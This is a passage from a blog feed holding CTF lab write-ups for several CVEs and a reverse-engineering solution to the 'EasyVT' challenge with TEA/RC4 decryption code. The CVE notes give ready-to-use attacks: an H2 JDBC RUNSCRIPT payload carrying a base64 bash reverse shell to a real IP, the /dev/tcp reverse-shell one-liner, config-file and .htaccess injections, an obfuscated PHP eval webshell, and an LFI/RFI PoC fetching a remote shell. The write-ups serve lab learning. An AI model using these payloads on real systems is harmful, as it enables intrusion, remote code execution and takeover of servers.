        <content type="html"><![CDATA[<p>A simple record.</p><span id="more"></span><h1 id="CVE-2022-22733"><a href="#CVE-2022-22733" class="headerlink" title="CVE-2022-22733"></a>CVE-2022-22733</h1><p>It is my first time to learn <strong>“PENETRATION”</strong> (just the same feeling as this)<br>Some skills are first to me. For this reason I will record it detaily.</p><p>Referencde:</p><ul><li><a href="https://blog.csdn.net/weixin_46029520/article/details/128222905">+</a></li><li><a href="https://blog.csdn.net/niubi707/article/details/128176246">++</a></li></ul><p>Although it is sad that I hadn’t manage to getflag, wtf the timeout… It is still meaningful~</p><p>First we use username:guest and passwd:guest + burpsuite to intercept,<br>find that the b64decoded token contains the admin’s username and passwd.</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;rootUsername&quot;:&quot;root&quot;,&quot;rootPassword&quot;:&quot;root&quot;,&quot;guestUsername&quot;:&quot;guest&quot;,&quot;guestPassword&quot;:&quot;guest&quot;,&quot;base64&quot;:...&#125;</span><br></pre></td></tr></table></figure><p>so we can login as root<br>we need use bounceshell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 1234</span><br></pre></td></tr></table></figure><p>then we prepare Malicious code, using sql.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> ALIAS <span class="keyword">EXEC</span> <span class="keyword">AS</span> <span class="string">&#x27;String shellexec(String cmd) throws java.io.IOException &#123;Runtime.getRuntime().exec(cmd);return &quot;123&quot;;&#125;&#x27;</span>;<span class="keyword">CALL</span> <span class="keyword">EXEC</span> (<span class="string">&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuNDguOTYuMTAwLzEyMzQgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>the cmd is:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/ip/1234 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>save it as hack.sql</p><p>next, use python to start a httpserver:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server <span class="number">9999</span></span><br></pre></td></tr></table></figure><p>and move .sql to the root of http</p><p>Finally, find EventDataTraceSource and add<br>url: jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT&#x3D;3;INIT&#x3D;RUNSCRIPT FROM ‘<a href="http://0.0.0.0:9999/hack.sql">http://0.0.0.0:9999/hack.sql</a>‘</p><p>Theroritcally, it should work…… WTF the IO.Exception… I don’t know how to solve this …</p><hr><hr><p>For the first time I know how to use bouceshell…<br>Linux1:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 1234</span><br></pre></td></tr></table></figure><p>Linux2:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/ip/1234 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>GetShell!!!</p><h1 id="CVE-2018-12530"><a href="#CVE-2018-12530" class="headerlink" title="CVE-2018-12530"></a>CVE-2018-12530</h1><p>Metinfo 6.0.0任意文件删除<br>进入靶场 访问&#x2F;admin 后台登陆<br>解除Install lock</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin/app/batch/csvup.php?fileField=test-1&amp;flienamecsv=../../../config/install.lock</span><br></pre></td></tr></table></figure><p>然后访问&#x2F;install<br>重点在第三步数据库设置<br>数据库密码: (闭合sql语句)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;*/assert($_REQUEST[1])/*&quot;</span><br></pre></td></tr></table></figure><p>保存后访问 &#x2F;config&#x2F;config_db.php?1&#x3D;phpinfo();<br>可以执行 写🐎 config&#x2F;config_db.php?1&#x3D;eval($POST[‘hack’])<br>蚁剑一把梭</p><h1 id="CVE-2022-25578"><a href="#CVE-2022-25578" class="headerlink" title="CVE-2022-25578"></a>CVE-2022-25578</h1><p>taocms v3.0.2允许攻击者通过编辑.htaccess文件执行任意代码</p><p>貌似有多种打法 这里就用编辑.htaccess来打<br>访问&#x2F;admin 弱口令admin登陆<br>在文件管理处编辑.htaccess</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure><p>然后准备一个简易图片🐎<br>这里最简单的马都能连<br>学一手高级点的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="class"><span class="keyword">class</span> <span class="title">G6MdvLsT</span> </span>&#123; <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$HF24f</span></span>)</span>&#123; @<span class="keyword">eval</span>(<span class="string">&quot;/*Z196iMYYE9*/&quot;</span>.<span class="variable">$HF24f</span>.<span class="string">&quot;&quot;</span>); &#125;&#125;<span class="keyword">new</span> <span class="title function_ invoke__">G6MdvLsT</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>缩略图上传 成功后会显示路径 蚁剑连一把梭</p><h1 id="CVE-2022-32991"><a href="#CVE-2022-32991" class="headerlink" title="CVE-2022-32991"></a>CVE-2022-32991</h1><p>开局一个登陆&#x2F;注册页面<br>这里sql注入是无果的<br>注册一个号登进去 发现三个quiz<br>注意到第一个点进去发现是php报错<br>同时url是这种:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eci-2ze2lwuvvf4rayf8ifyf.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=3</span><br></pre></td></tr></table></figure><p>发现每次点击submit n的值就+1 尝试n&#x3D;3’发现报错 应该能报错注入<br>由于需要cookie等登陆信息 bp抓get包后sqlmap一把梭<br><img src="/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E9%9D%B6%E5%9C%BA/images/image.png" alt="img"></p><hr><hr><p>sql注入的关键都是注入点的准确挖掘!!!</p><h1 id="CVE-2022-23134"><a href="#CVE-2022-23134" class="headerlink" title="CVE-2022-23134"></a>CVE-2022-23134</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Zabbix Sia Zabbix是拉脱维亚Zabbix SIA（Zabbix Sia）公司的一套开源的监控系统。该系统支持网络监控、服务器监控、云监控和应用监控等。 Zabbix 存在安全漏洞，该漏洞源于在初始设置过程之后，setup.php 文件的某些步骤不仅可以由超级管理员访问，也可以由未经身份验证的用户访问。</span><br></pre></td></tr></table></figure><p>不是题目说的打法<br>这里利用的是类似ssrf的打法<br>zabbix 默认Admin zabbix 登陆后<br>在Adminxxx&#x2F;scripts下找到ping命令<br><a href="http://www.dnslog.cn/">dnslog</a>起一个subdomain 修改script并在monitor&#x2F;maps下执行ping发现确实存在ssrf<br>那就直接读取flag<br><code>cat ../../../../../../../../flag</code></p><h1 id="CVE-2018-19422"><a href="#CVE-2018-19422" class="headerlink" title="CVE-2018-19422"></a>CVE-2018-19422</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Subrion CMS 4.2.1 存在文件上传漏洞</span><br></pre></td></tr></table></figure><p>难点在于在哪儿上传什么后缀的文件…<br>admin&#x2F;admin 弱密码登陆<br>在profile处可以上传avatar 但是传php蚁剑可以连但是添加无法进… 假shell…<br>看wp说是点右上角设置进入后台 content处有个upload<br>上传 .pht后缀的马!!! 其他格式的都不行！！！<br><code>PHT文件是一个HTML页面，其中包括一个PHP脚本。这种格式似乎已过时，不再使用。</code></p><p>真的很神奇… 传.pht后可以打开 其他都打不开… 新姿势…<br>连上蚁剑一把梭…</p><h1 id="CVE-2018-16283"><a href="#CVE-2018-16283" class="headerlink" title="CVE-2018-16283"></a>CVE-2018-16283</h1><p>WordPress Plugin Wechat Broadcast LFI</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># Exploit Title: WordPress Plugin Wechat Broadcast 1.2.0 - Local File Inclusion</span><br><span class="line"># Author: Manuel Garcia Cardenas</span><br><span class="line"># Date: 2018-09-19</span><br><span class="line"># Software link: https://es.wordpress.org/plugins/wechat-broadcast/</span><br><span class="line"># CVE: CVE-2018-16283</span><br><span class="line"></span><br><span class="line"># Description</span><br><span class="line"># This bug was found in the file: /wechat-broadcast/wechat/Image.php</span><br><span class="line"># echo file_get_contents(isset($_GET[&quot;url&quot;]) ? $_GET[&quot;url&quot;] : &#x27;&#x27;);</span><br><span class="line"># The parameter &quot;url&quot; it is not sanitized allowing include local or remote files</span><br><span class="line"># To exploit the vulnerability only is needed use the version 1.0 of the HTTP protocol </span><br><span class="line"># to interact with the application.</span><br><span class="line"></span><br><span class="line"># PoC</span><br><span class="line"># The following URL have been confirmed that is vulnerable to local and remote file inclusion.</span><br><span class="line"></span><br><span class="line">GET /wordpress/wp-content/plugins/wechat-broadcast/wechat/Image.php?url=../../../../../../../../../../etc/passwd</span><br><span class="line"></span><br><span class="line"># Remote File Inclusion POC:</span><br><span class="line"></span><br><span class="line">GET /wordpress/wp-content/plugins/wechat-broadcast/wechat/Image.php?url=http://malicious.url/shell.txt</span><br></pre></td></tr></table></figure><p>首先在wordpress的后台登陆 <code>/wp-admin</code><br>wpscan扫出<code>test</code>用户名 弱口令 <code>test test</code> 登陆<br>然后按照上面POC的打 读取 <code>/flag</code> 即可</p><p>但实操的时候 要用 <code>?url=file:///flag</code> 伪协议来读才读得到(…)</p><p>贴一个wordpress的渗透基础步骤 <a href="https://c0okb.github.io/2020/05/01/wordpress-vulnhub"><code>++</code></a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>VT处理器虚拟化技术学习</title>
      <link href="/VT%E5%A4%84%E7%90%86%E5%99%A8%E8%99%9A%E6%8B%9F%E5%8C%96%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/"/>
      <url>/VT%E5%A4%84%E7%90%86%E5%99%A8%E8%99%9A%E6%8B%9F%E5%8C%96%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>对VT技术的初步学习</p><span id="more"></span><h1 id="VT技术"><a href="#VT技术" class="headerlink" title="VT技术"></a>VT技术</h1><p>学习资料:</p><ul><li><a href="https://www.fup1p1.cn/archives/reverse%E5%88%9D%E8%AF%86vt%E5%A4%84%E7%90%86%E5%99%A8%E8%99%9A%E6%8B%9F%E5%8C%96%E6%8A%80%E6%9C%AF%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91easyvt%E5%A4%8D%E7%8E%B0">+</a></li><li><a href="https://github.com/zzhouhe/VT_Learn">++</a></li></ul><p>具体的操作系统层面以及寄存器的处理看学习资料<br>这里主要关注整个流程</p><p><img src="https://s2.loli.net/2024/01/24/zSib7smPpvXOQhy.png" alt="VT.png"></p><h1 id="相关例题"><a href="#相关例题" class="headerlink" title="相关例题"></a>相关例题</h1><h2 id="西湖论剑2022-EasyVT"><a href="#西湖论剑2022-EasyVT" class="headerlink" title="西湖论剑2022 EasyVT"></a>西湖论剑2022 EasyVT</h2><p>具体的入口等地方可以对照Github上zhouhe的简易VT版本来找<br>这里直接分析分发函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// !!!!!!</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_401C90</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp+4h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp+8h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="built_in">sub_4010AE</span>(<span class="number">0x4402</span>);</span><br><span class="line">  v1 = <span class="built_in">sub_4010AE</span>(<span class="number">0x440C</span>);</span><br><span class="line">  dword_4040C4 = <span class="built_in">sub_4010AE</span>(<span class="number">0x6820</span>);</span><br><span class="line">  dword_4040B0 = <span class="built_in">sub_4010AE</span>(<span class="number">0x681C</span>);</span><br><span class="line">  dword_4040C0 = <span class="built_in">sub_4010AE</span>(<span class="number">0x681E</span>);</span><br><span class="line">  <span class="keyword">switch</span> ( v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">10</span>:                                    <span class="comment">// CPUID</span></span><br><span class="line">      <span class="built_in">sub_401180</span>();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">18</span>:                                    <span class="comment">// VMCALL</span></span><br><span class="line">      <span class="built_in">sub_401250</span>();                             <span class="comment">// RC4</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">19</span>:                                    <span class="comment">// VMCLEAR</span></span><br><span class="line">      <span class="built_in">sub_4012B0</span>();                             <span class="comment">// 真TEA_SUM</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">20</span>:                                    <span class="comment">// VMLAUNCH</span></span><br><span class="line">      <span class="built_in">sub_401450</span>();                             <span class="comment">// 真RC4_KEY和ENC_0 ENC_1</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">21</span>:                                    <span class="comment">// VMPTRLD</span></span><br><span class="line">      <span class="built_in">sub_4017B0</span>();                             <span class="comment">// 真TEA_DELTA</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">22</span>:                                    <span class="comment">// VMPTRST</span></span><br><span class="line">      <span class="built_in">sub_401940</span>();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">23</span>:                                    <span class="comment">// VMREAD</span></span><br><span class="line">      <span class="built_in">sub_401970</span>();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">24</span>:                                    <span class="comment">// VMRESUME</span></span><br><span class="line">      <span class="built_in">sub_4019C0</span>();                             <span class="comment">// tea</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">25</span>:                                    <span class="comment">// VMWRITE</span></span><br><span class="line">      <span class="built_in">sub_401A90</span>();                             <span class="comment">// 真TEA_KEY</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">26</span>:                                    <span class="comment">// VMXOFF</span></span><br><span class="line">      <span class="built_in">sub_401590</span>();                             <span class="comment">// CHECK</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">27</span>:                                    <span class="comment">// VMXON</span></span><br><span class="line">      <span class="built_in">sub_401610</span>();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">28</span>:                                    <span class="comment">// Control-register acesses</span></span><br><span class="line">      <span class="built_in">sub_4011D0</span>();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">sub_4010BF</span>(<span class="number">26654</span>, v1 + dword_4040C0);</span><br><span class="line">  <span class="built_in">sub_4010BF</span>(<span class="number">26652</span>, dword_4040B0);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sub_4010BF</span>(<span class="number">26656</span>, dword_4040C4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的各个参数的宏定义可以翻Intel的manual</p><p><img src="https://s2.loli.net/2024/01/24/dLgPRkX2ZnDS1m5.png" alt="IntelManual-1.png"><br><img src="https://s2.loli.net/2024/01/24/HztYWfG672xUKcj.png" alt="IntelManual-2.png"></p><p>然后跟着上面的流程来走<br><img src="https://s2.loli.net/2024/01/24/zSib7smPpvXOQhy.png" alt="VT.png"></p><p>这里出题人设置了很多混淆的赋值操作 细心点慢慢找<br>发现是在 VM_CALL(VM_EXIT)的时候调用RC4 在VM_RESUME的时候调用tea<br>然后往前找邻近点看参数设置即可</p><p>最后就是写exp 要注意很多参数的顺序是变了的 输入跟加密也不是对应关系<br>解tea:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> enc[<span class="number">8</span>] = &#123;</span><br><span class="line">    <span class="number">0x5C073994</span>, <span class="number">0x0D805CB3</span>, <span class="number">0x87DDA586</span>, <span class="number">0x0317FB8E</span>, <span class="number">0x6520EF29</span>, <span class="number">0x5A4987AF</span>, <span class="number">0xEB2DC2A4</span>, <span class="number">0x38CF470E</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> key[<span class="number">4</span>] = &#123;</span><br><span class="line">    <span class="number">0x00102030</span>, <span class="number">0x40506070</span>, <span class="number">0x8090A0B0</span>, <span class="number">0xC0D0E0F0</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> _=<span class="number">0</span>;_&lt;<span class="number">4</span>;_++)&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> enc_0,enc_1,tk1,tk2,tk3,tk4,sum,DELTA;</span><br><span class="line">enc_0 = enc[_*<span class="number">2</span>],enc_1 = enc[_*<span class="number">2</span>+<span class="number">1</span>];</span><br><span class="line">tk1 = key[<span class="number">0</span>],tk2 = key[<span class="number">1</span>],tk3 = key[<span class="number">3</span>],tk4 = key[<span class="number">2</span>];</span><br><span class="line">DELTA = <span class="number">0xC95D6ABF</span>;</span><br><span class="line">sum = <span class="number">0x20000000</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)sum -= DELTA;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)&#123;</span><br><span class="line">sum += DELTA;</span><br><span class="line">enc_1 -= (tk1 + ((<span class="type">unsigned</span> <span class="type">int</span>)enc_0 &gt;&gt; <span class="number">5</span>)) ^ (sum + enc_0) ^ (tk4 + <span class="number">16</span> * enc_0);</span><br><span class="line">enc_0 += (tk3 + ((<span class="type">unsigned</span> <span class="type">int</span>)enc_1 &gt;&gt; <span class="number">5</span>)) ^ (sum + enc_1) ^ (tk2 + <span class="number">16</span> * enc_1);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)</span><br><span class="line">cout&lt;&lt;((enc_1&gt;&gt;(<span class="number">8</span>*(i)))&amp;<span class="number">0xff</span>)&lt;&lt;<span class="string">&quot;,&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)</span><br><span class="line">cout&lt;&lt;((enc_0&gt;&gt;(<span class="number">8</span>*(i)))&amp;<span class="number">0xff</span>)&lt;&lt;<span class="string">&quot;,&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解RC4： 要注意它是8位一组进行RC4 不是整体的RC4</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> enc[]=&#123;<span class="number">213</span>,<span class="number">18</span>,<span class="number">156</span>,<span class="number">184</span>,<span class="number">44</span>,<span class="number">122</span>,<span class="number">126</span>,<span class="number">177</span>,<span class="number">209</span>,<span class="number">66</span>,<span class="number">152</span>,<span class="number">191</span>,<span class="number">33</span>,<span class="number">115</span>,<span class="number">37</span>,<span class="number">230</span>,<span class="number">208</span>,<span class="number">69</span>,<span class="number">205</span>,<span class="number">237</span>,<span class="number">33</span>,<span class="number">41</span>,<span class="number">38</span>,<span class="number">178</span>,<span class="number">220</span>,<span class="number">73</span>,<span class="number">155</span>,<span class="number">185</span>,<span class="number">44</span>,<span class="number">45</span>,<span class="number">114</span>,<span class="number">186</span>&#125;;</span><br><span class="line">string key = <span class="string">&quot;04e52c7e31022b0b&quot;</span>;</span><br><span class="line"><span class="type">int</span> base64_table[<span class="number">8</span>];</span><br><span class="line"><span class="type">int</span> s[<span class="number">256</span>],k[<span class="number">256</span>];</span><br><span class="line"><span class="type">int</span> j=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">            s[i] = i;</span><br><span class="line">            k[i] = key[i % <span class="number">16</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i2 = <span class="number">0</span>; i2 &lt; <span class="number">256</span>; i2++) &#123;</span><br><span class="line">            j = (s[i2] + j + k[i2]) &amp; <span class="number">255</span>;</span><br><span class="line">            <span class="type">int</span> temp = s[i2];</span><br><span class="line">            s[i2] = s[j];</span><br><span class="line">            s[j] = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> ss[<span class="number">256</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> kkk=<span class="number">0</span>;kkk&lt;<span class="number">4</span>;kkk++)&#123;</span><br><span class="line"><span class="built_in">memset</span>(base64_table,<span class="number">0</span>,<span class="built_in">sizeof</span>(base64_table));</span><br><span class="line"><span class="built_in">memset</span>(ss,<span class="number">0</span>,<span class="built_in">sizeof</span>(ss));</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++)ss[i]=s[i];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)</span><br><span class="line">base64_table[i] = enc[kkk*<span class="number">8</span>+i];</span><br><span class="line"><span class="type">int</span> flag[<span class="number">8</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> cnt=<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> j2 = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> i3 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i4 : base64_table) &#123;</span><br><span class="line">            i3 = (i3 + <span class="number">1</span>) &amp; <span class="number">255</span>;</span><br><span class="line">            j2 = (ss[i3] + j2) &amp; <span class="number">255</span>;</span><br><span class="line">            <span class="type">int</span> temp2 = ss[i3];</span><br><span class="line">            ss[i3] = ss[j2];</span><br><span class="line">            ss[j2] = temp2;</span><br><span class="line">            <span class="type">int</span> rnd = ss[(ss[i3] + ss[j2]) &amp; <span class="number">255</span>];</span><br><span class="line">            flag[cnt++] = (i4 ^ rnd);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)</span><br><span class="line">        cout&lt;&lt;(<span class="type">char</span>)flag[i+<span class="number">4</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)</span><br><span class="line">        cout&lt;&lt;(<span class="type">char</span>)flag[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>DASCTF{81920c3758be43705ba154bb8f599846}</strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF-Re </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Resource-Collection</title>
      <link href="/Resource-Collection/"/>
      <url>/Resource-Collection/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="0189d35381064a856d8ad495dd67f5d46bac55a411c6b2c4e8726088b759edd8"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>angr库学习</title>
      <link href="/angr%E5%BA%93%E5%AD%A6%E4%B9%A0/"/>
      <url>/angr%E5%BA%93%E5%AD%A6%E4%B9%A0/</url>
      
